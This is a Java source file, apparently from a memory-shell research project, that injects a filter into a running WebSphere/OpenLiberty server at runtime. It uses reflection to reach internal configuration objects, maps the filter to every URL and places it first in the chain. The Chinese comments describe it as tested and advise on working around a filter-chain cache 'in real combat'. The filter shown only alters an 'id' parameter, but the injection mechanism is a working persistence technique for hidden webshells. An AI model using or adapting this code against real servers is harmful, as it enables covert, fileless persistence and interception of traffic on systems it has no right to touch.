package org.su18.memshell.test.websphere;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletRequestWrapper;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.EnumSet;
import java.util.List;

/**
 * 来自项目 https://github.com/feihong-cs/memShell
 * 亲测有效
 * 测试版本 WebSphere/Liberty 20.0.0.12
 * 需要注意的是，feihong-cs 师傅在项目中测试的是较低版本的 websphere，我测试的是较高版本的 OpenLiberty
 * 在这个版本中 com.ibm.ws.webcontainer.filter.WebAppFilterManager 有一个 this.chainCache 机制
 * 导致如果一个真实存在的 Servlet 如果进行访问过，则其 filterchain 可能被缓存，动态添加的 filter 可能不生效
 * 如果没访问过，添加 filter 后即可生效，高版本实战中可以考虑在缓存中添加 filter 的操作
 *
 * @author su18
 */
public class AddWebsphereFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
		try {
			String filterName = "su18WebsphereFilter";
			String urlPattern = "/*";

			ServletContext servletContext = req.getServletContext();

			Field field = servletContext.getClass().getSuperclass().getSuperclass().getDeclaredField("context");
			field.setAccessible(true);
			Object context = field.get(servletContext);

			field = context.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("config");
			field.setAccessible(true);
			Object webAppConfiguration = field.get(context);

			Method   method  = null;
			Method[] methods = webAppConfiguration.getClass().getMethods();
			for (int i = 0; i < methods.length; i++) {
				if (methods[i].getName().equals("getFilterMappings")) {
					method = methods[i];
					break;
				}
			}
			List filerMappings = (List) method.invoke(webAppConfiguration, new Object[0]);

			boolean flag = false;
			for (int i = 0; i < filerMappings.size(); i++) {
				Object filterConfig = filerMappings.get(i).getClass().getMethod("getFilterConfig", new Class[0]).invoke(filerMappings.get(i), new Object[0]);
				String name         = (String) filterConfig.getClass().getMethod("getFilterName", new Class[0]).invoke(filterConfig, new Object[0]);
				if (name.equals(filterName)) {
					flag = true;
					break;
				}
			}

			//如果已存在同名的 Filter，就不在添加，防止重复添加
			if (!flag) {

				Filter filter = new TestFilter();

				Object filterConfig = context.getClass().getMethod("createFilterConfig", new Class[]{String.class}).invoke(context, new Object[]{filterName});
				filterConfig.getClass().getMethod("setFilter", new Class[]{Filter.class}).invoke(filterConfig, new Object[]{filter});

				method = null;
				methods = webAppConfiguration.getClass().getMethods();
				for (int i = 0; i < methods.length; i++) {
					if (methods[i].getName().equals("addFilterInfo")) {
						method = methods[i];
						break;
					}
				}
				method.invoke(webAppConfiguration, new Object[]{filterConfig});

				field = filterConfig.getClass().getSuperclass().getDeclaredField("context");
				field.setAccessible(true);
				Object original = field.get(filterConfig);

				//设置为null，从而 addMappingForUrlPatterns 流程中不会抛出异常
				field.set(filterConfig, null);

				method = filterConfig.getClass().getDeclaredMethod("addMappingForUrlPatterns", new Class[]{EnumSet.class, boolean.class, String[].class});
				method.invoke(filterConfig, new Object[]{EnumSet.of(DispatcherType.REQUEST), true, new String[]{urlPattern}});

				//addMappingForUrlPatterns 流程走完，再将其设置为原来的值
				field.set(filterConfig, original);

				method = null;
				methods = webAppConfiguration.getClass().getMethods();
				for (int i = 0; i < methods.length; i++) {
					if (methods[i].getName().equals("getUriFilterMappings")) {
						method = methods[i];
						break;
					}
				}

				//这里的目的是为了将我们添加的动态 Filter 放到第一位
				List uriFilterMappingInfos = (List) method.invoke(webAppConfiguration, new Object[0]);
				uriFilterMappingInfos.add(0, filerMappings.get(filerMappings.size() - 1));

				resp.getWriter().println("websphere/liberty filter added");
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	public static class TestFilter implements Filter {

		/**
		 * 初始化 filter
		 *
		 * @param filterConfig FilterConfig
		 */
		@Override
		public void init(FilterConfig filterConfig) {
		}

		/**
		 * doFilter 方法处理过滤器逻辑
		 *
		 * @param servletRequest  ServletRequest
		 * @param servletResponse ServletResponse
		 * @param filterChain     FilterChain
		 * @throws IOException      抛出异常
		 * @throws ServletException 抛出异常
		 */
		@Override
		public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
			// 给下一个过滤器
			filterChain.doFilter(new AddWebsphereFilter.TestFilter.FilterRequest((HttpServletRequest) servletRequest), servletResponse);
		}

		/**
		 * 销毁时执行的方法
		 */
		@Override
		public void destroy() {
		}

		/**
		 * 自定义 FilterRequest 重写 getParameter 方法处理 id 值
		 */
		class FilterRequest extends HttpServletRequestWrapper {

			public FilterRequest(HttpServletRequest request) {
				super(request);
			}

			@Override
			public String getParameter(String name) {
				if ("id".equals(name)) {
					String originalId = super.getParameter(name);

					if (originalId != null && !originalId.isEmpty()) {
						int idNum = (Integer.parseInt(originalId) * 15);
						return Integer.toString(idNum);
					}
				}
				return super.getParameter(name);
			}
		}
	}

}
